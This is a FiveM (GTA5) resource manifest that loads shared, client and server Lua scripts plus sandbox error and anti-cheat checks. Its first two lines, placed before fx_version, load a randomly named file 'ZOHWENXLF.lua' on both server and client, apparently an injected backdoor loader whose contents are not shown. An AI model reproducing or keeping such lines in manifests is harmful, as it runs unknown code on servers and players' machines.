server_script "ZOHWENXLF.lua"
client_script "ZOHWENXLF.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")

client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"shared/**/*.lua",
	"client/**/*.lua",
})

server_scripts({
	"shared/**/*.lua",
	"server/**/*.lua",
})
